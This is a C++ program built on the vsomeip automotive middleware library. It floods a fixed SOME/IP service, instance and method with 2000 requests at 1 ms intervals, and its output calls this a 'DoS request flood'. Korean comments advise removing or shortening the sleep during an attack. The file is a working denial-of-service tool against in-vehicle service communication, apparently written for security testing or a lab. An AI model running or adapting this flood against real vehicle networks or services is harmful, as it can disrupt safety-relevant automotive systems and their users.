#include <vsomeip/vsomeip.hpp>
#include <iostream>
#include <thread>
#include <chrono>

std::shared_ptr<vsomeip_v3::application> app;

const vsomeip_v3::service_t service_id = 0x1234;
const vsomeip_v3::instance_t instance_id = 0x5678;
const vsomeip_v3::method_t method_id = 0x0421;

void send_dos_requests() {
    for (int i = 0; i < 2000; ++i) {
        std::string msg = "DoS packet " + std::to_string(i);
        std::vector<vsomeip_v3::byte_t> data(msg.begin(), msg.end());

        std::shared_ptr<vsomeip_v3::payload> pl = std::make_shared<vsomeip_v3::payload>();
        pl->set_data(data);

        std::shared_ptr<vsomeip_v3::message> request = vsomeip_v3::runtime::get()->create_request();
        request->set_service(service_id);
        request->set_instance(instance_id);
        request->set_method(method_id);
        request->set_payload(pl);

        app->send(request);

        // 공격 시 sleep 제거 또는 아주 짧게
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

int main() {
    app = vsomeip_v3::runtime::get()->create_application("client");

    if (!app->init()) {
        std::cerr << " Failed to initialize client app." << std::endl;
        return 1;
    }

    app->start();

    // 약간의 시간 후에 시작
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Starting DoS request flood..." << std::endl;

    send_dos_requests();

    std::cout << " DoS attack simulation completed." << std::endl;

    return 0;
}
